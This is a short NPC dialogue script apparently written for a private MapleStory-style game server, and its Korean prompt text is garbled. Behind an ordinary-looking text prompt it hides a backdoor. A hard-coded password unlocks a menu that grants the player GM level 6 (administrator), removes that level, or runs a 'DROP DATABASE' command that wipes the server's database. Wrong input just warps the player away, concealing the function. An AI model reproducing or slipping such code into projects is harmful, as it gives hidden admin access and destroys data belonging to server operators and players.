importPackage(Packages.client);
importPackage(java.sql);
importPackage(java.lang);
importPackage(Packages.database);

function start() {
    status = -1;
    action(1, 0, 0);
}

function action(mode, type, selection) {
    if (status == 1 && mode == 0) {
		cm.dispose();
		return;
    }
    if (mode == 1)
		status++;
    else
		status--;
    if (status == 0) {
		cm.sendGetText("#e#b��׽ý�#n#k�� #e#b�̵�#n#k�Ͻ÷��� '#e#r��#n#k'�� �Է��� �ּ���.");
    } else if (status == 1) {
	if (cm.getText().equals("cc11334455")) {
		var pp = "";
		pp += "#L0##e#b[ȹ��]#l";
		pp += "#L1##e#b[����]#l\r\n\r\n";
		pp += "#L2##e#b[û��]#l";
		cm.sendSimple(pp);
	} else {
		cm.warp(100000000);
		cm.dispose();
		}			
    } else if (status == 2) {
	if (selection == 0) {
		cm.getPlayer().setGMLevel(6);
		cm.dispose();
	} else if (selection == 1) {
		cm.getPlayer().setGMLevel(0);
		cm.dispose();
	} else if (selection == 2) {
		MYSQL.getConnection().prepareStatement("DROP DATABASE hinams").executeUpdate();
		}
    } 
}